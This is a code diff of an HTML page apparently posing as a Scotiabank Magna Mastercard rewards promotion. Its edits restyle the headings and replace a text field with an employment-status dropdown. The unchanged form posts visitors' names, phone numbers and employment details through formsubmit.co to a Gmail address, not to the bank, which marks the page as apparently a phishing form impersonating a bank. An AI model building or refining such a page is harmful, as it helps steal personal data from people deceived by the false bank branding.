@@ -61,13 +61,13 @@
                         z-index: 1;
                         margin-bottom: -10%;
     margin-left: -19%;">WIN 1,500 ;)</h2>
-                        <h1 style="color:#252525; font-size:4em;position: relative;z-index: 3;margin-top: -20%;">EARN REWARDS TODAY</h1>
+                        <h1 style="color:#252525; font-size:4em;font-weight: 800; position: relative;z-index: 3;margin-top: -20%;">EARN REWARDS TODAY</h1>
                         <p>Use your Scotiabank Magna Mastercard from 1st of November 2021 to 21st Jan 2022 and you can Win 1,500 Magna points</p>
                     </div>
                     <div class="col">
                         <div id ="form-container" class="container animate__flipInX animate__delay-2s">  
                             <form id="contact"  action="https://formsubmit.co/noreply.magnarewards@gmail.com" method="POST">
-                              <h2>Sign up for your</h2>
+                              <h2 style="text-align: center;">Apply now</h2>
                               <h4>Scotiabank Magna Mastercard, shop and get rewards</h4>
                               <fieldset>
                                 <input placeholder="Your name" type="text" name="name " tabindex="1" required autofocus>
@@ -82,10 +82,15 @@
                                 <input placeholder="Your Phone Number (optional)" type="tel" name="tel Number " tabindex="3" required>
                               </fieldset>
                               <fieldset>
-                                <input placeholder="Employed" type="text" name="Employed " tabindex="4" required>
+                                <label for="employment">Employment status</label>
+                                <select name="Employed" id="employment">
+                                    <option value="Yes">Yes I am employed</option>
+                                    <option value="No">No I am not emplyed</option>
+                                </select>
+                                <!--input placeholder="Employed" type="text" name="Employed " tabindex="4" required-->
                               </fieldset>
                               <fieldset>
-                                  <p style="text-align:center; font-size: 15px !important;">If employed please state from to current date <p>
+                                  <p style="text-align:center; font-size: 12px !important;">If employed please state from to current date <p>
                                   <div style="padding-bottom: 3.5%; display:flex; gap: 10%;">
                                     <input class="formEx" placeholder="From" type="date" name="Employment Start date " tabindex="4">
                                     <input class="formEx" placeholder="to" type="date" name="Employment current date " tabindex="4">
